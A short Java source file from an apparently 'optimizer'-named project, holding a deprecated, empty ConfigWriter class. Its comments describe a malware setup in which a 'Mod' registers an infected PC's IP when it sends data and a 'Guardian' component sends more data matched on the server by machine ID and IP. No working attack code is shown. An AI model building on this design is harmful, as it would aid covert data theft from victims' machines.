package com.example.optimizer;

/**
 * ConfigWriter - DEPRECATED
 * Guardian now uses IP-based matching on the server side.
 * No config.dat file is needed anymore.
 * This class is kept for backwards compatibility but does nothing.
 */
public class ConfigWriter {
    
    /**
     * Deprecated - does nothing now.
     * Guardian uses machine ID + IP matching on server side.
     */
    public static void writeConfig(String buildKey) {
        // No longer needed - server uses IP-based matching for Guardian
        // The Mod registers the infected PC's IP when it sends data
        // Guardian then sends with just machine ID and server matches by IP
    }
}
